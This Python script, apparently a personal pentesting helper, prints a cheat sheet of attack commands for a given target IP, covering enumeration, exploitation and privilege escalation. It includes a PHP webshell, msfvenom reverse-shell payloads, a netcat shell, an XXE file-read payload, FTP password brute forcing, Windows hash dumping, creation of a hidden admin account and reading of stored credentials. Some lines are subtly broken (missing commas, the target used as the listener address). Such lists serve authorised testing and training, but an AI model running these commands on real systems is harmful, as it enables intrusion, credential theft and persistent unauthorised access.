#!/usr/bin/python3
# author: suffs811
# Copyright (c) 2024 suffs811
# https://github.com/suffs811/projects/cmds/cmd.git
# read the README.md file for more details; software distributed under MIT license; for personal, legal use only.
#
# enter your target IP to get suggested pentesting commands

import argparse

parser = argparse.ArgumentParser(description="get suggested pentesting commands for your target ip")
parser.add_argument("target_ip", help="specify target ip")
args = parser.parse_args()
ip = args.target_ip

cmds = [
	"########## ENUMERATION ##########",
	f"*** scan for open ports ***\nnmap -vv -sS -Pn -oN {ip}.nmap -p- {ip}",
	f"*** get service info and vulns on ports ***\nnmap -vv -sC -sV --script=vuln -p <port,port> {ip}",
	f"*** enumerate smb shares ***\nenum4linux -a {ip}",
	f"*** enumerate web subdomains ***\nsublist3r -d {ip}",
	f"*** enumerate web server ***\nnikto -h {ip}",
	f"*** find web directories ***\ngobuster dir -u {ip} -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt",
	f"*** get domain info ***\nwhatweb {ip}",
	f"*** send 1 packet to port 80 ***\nhping3 –A –p80 –c1 {ip}",
	f"*** create password list from webpage ***\ncewl -d 1 -m 5 wordlist.txt {ip}",
	f"*** find emails on webpage ***\ncewl {ip} -n -e",
	f"*** port knocking ***\nfor PORT in 1111 2222 3333 4444; do nc -vz {ip} $PORT; done;",

	"########## EXPLOITATION ##########",
	"*** php webshell in url\n<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>'; ?>",
	f"*** rdp into windows host\nxfreerdp /dynamic-resolution +clipboard /cert:ignore /v:{ip} /u:USERNAME /p:'PASSWORD'",
	f"*** remote shell\nssh <user>@{ip}"
	"*** list msfvenom payloads\nmsfvenom --list payloads",
	f"*** .exe reverse shell\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT=4444 -f exe > win_shell.exe",
	f"*** php reverse shell\nmsfvenom -p php/meterpreter/reverse_tcp LHOST={ip} LPORT=4444 -f raw -e php/base64 > payload.php",
	f"*** linux reverse shell\nmsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ip} LPORT=4444 -f elf > rev_shell.elf"
	f"*** bind a shell\nnc {ip} 4444 -e /bin/bash",
	"*** netcat listener\nnc -nlvp 4444",
	f"*** crack password with john\njohn --format=(raw-md5/raw-sha1/nt/sha512crypt) --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
	"*** xxe: read /etc/passwd\n<?xml version='1.0'?>\n<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>\n<root>&read;</root>",
	"*** test for xxs ***\n<script>alert(“Hello World”)</script>",
	"*** crack an md5 (or change -m) hash ***\nhashcat -a 0 -m 0 -r <hash file> <wordlist>",
	f"*** view smb share ***\nsmbclient //{ip}/<share> -U Anonymous",
	f"*** ftp login ***\nftp {ip}",
	"*** start python server ***\npython3 -m http.server 4444",
	f"*** brute force ftp password ***\nhydra -t 4 -l <username> -P /usr/share/wordlists/rockyou.txt -vV {ip} ftp",
	f"*** enumerate nfs mounts ***\nshowmount -e {ip}\nmkdir /tmp/mount\nsudo mount -t nfs {ip}:<share> /tmp/mount/ -nolock",
	"*** find windows users with kerbrute ***\n./kerbrute userenum -d <DOMAIN>.local --dc <DOMAIN>.local /user.txt",
	"*** ^ then, check if users are asreproastable ***\npython3 /opt/impacket/examples/GetNPUsers.py -usersfile user.txt <DOMAIN>.local/svc-admin -no-pas",

	"########## Privilege Escalation ##########",
	"*** find linux SUID files ***\nfind / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null",
	"*** find sudoable commands in linux ***\nsudo -l",
	f"*** dump windows hashes with user acct ***\npython3 /opt/impacket/examples/secretsdump.py  -just-dc <username>@{ip}",
	"*** check for windows passwds ***\nC:\Windows\System32\Config\SAM",
	"*** search files in windows ***\nGet-Childitem –Path C:\ -Include <FILE> -Recurse -ErrorAction SilentlyContinue",
	"*** add new admin user in windows ***\nnet user <username> <password> /add & net localgroup administrators <username> /add",
	"*** windows cmd history ***\ntype %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt",
	"*** windows powershell history ***\ntype $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt",
	"*** windows saved creds ***\ncmdkey /list\nrunas /savecred /user:<user> cmd.exe",
	"*** windows web server database for creds ***\ntype C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString\ntype C:\inetpub\wwwroot\web.config | findstr connectionString",
	"*** windows PuTTY proxy Config File ***\nreg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f 'Proxy' /s",
	"*** get windows services info ***\nwmic product get name,version,vendor",
	"*** check windows services for vulns ***\nsc qc"
]

for c in cmds:
	print(f"\n{c}")
